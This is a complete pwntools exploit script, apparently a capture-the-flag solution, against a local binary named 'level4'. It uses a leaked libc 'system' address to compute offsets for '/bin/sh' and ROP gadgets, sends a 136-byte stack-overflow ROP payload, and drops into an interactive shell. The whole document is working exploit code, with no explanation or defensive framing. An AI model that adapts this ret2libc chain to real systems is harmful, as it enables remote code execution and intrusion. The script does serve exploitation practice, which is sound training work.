#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
p = process('./level4')
# p = remote('127.0.0.1',10001)
elf = ELF('./level4')
libc = ELF('./libc.so.6')
offset = 136
# gdb.attach(p)
system_offset = libc.symbols['system']
str_bin_sh_offset = next(libc.search('/bin/sh')) - system_offset
pop_rdi_ret_offset = 0x0000000000021102 - system_offset
pop_rax_rdi_call_offset = 0x0000000000107419 - system_offset
log.success('system_offset = ' + hex(system_offset))
log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))
log.success('pop_rdi_ret_offset = ' + hex(pop_rdi_ret_offset))
log.success('pop_rax_rdi_call_offset = ' + hex(pop_rax_rdi_call_offset))
system = int(p.recvline()[:-1], 16)
str_bin_sh = system + str_bin_sh_offset
pop_rdi_ret = system + pop_rdi_ret_offset
pop_rax_rdi_call = system + pop_rax_rdi_call_offset
log.success('system = ' + hex(system))
log.success('str_bin_sh = ' + hex(str_bin_sh))
log.success('pop_rdi_ret = ' + hex(pop_rdi_ret))
log.success('pop_rax_rdi_call = ' + hex(pop_rax_rdi_call))
payload1 = flat(['A' * offset, pop_rdi_ret, str_bin_sh, system])
payload2 = flat(['A' * offset, pop_rax_rdi_call, system, str_bin_sh])
p.sendlineafter('Hello, World', payload2)
p.interactive()
